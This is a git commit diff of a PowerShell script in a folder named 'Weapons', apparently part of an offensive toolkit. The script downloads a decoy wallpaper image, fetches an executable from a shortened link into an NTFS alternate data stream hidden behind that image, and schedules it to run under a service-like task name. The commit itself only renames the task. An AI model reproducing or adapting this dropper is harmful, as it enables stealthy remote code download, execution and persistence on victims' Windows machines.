9ba5e21b403a224c50c2d5fe1a9ef9629dbf5ea8
Anant Kaul <56610952+anantkaul@users.noreply.github.com>
2022-03-05 03:49:18 +0530

    Update reg64.ps1

--- Weapons/reg64.ps1
+++ Weapons/reg64.ps1
@@ -4,4 +4,4 @@ mkdir C:\ProgramData\.temp
 [Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'
 curl https://wallpaperaccess.com/full/94002.jpg -o C:\ProgramData\.temp\94002.jpg
 cmd /c "curl https://bit.ly/3sJgOjB -o C:\ProgramData\.temp\94002.jpg:services.exe"
-schtasks /create /tn "services_free.exe" /tr C:\ProgramData\.temp\94002.jpg:services.exe /sc once /sd 25/12/2025 /st 15:00:00 /z
+schtasks /create /tn "servicesfc.exe" /tr C:\ProgramData\.temp\94002.jpg:services.exe /sc once /sd 25/12/2025 /st 15:00:00 /z
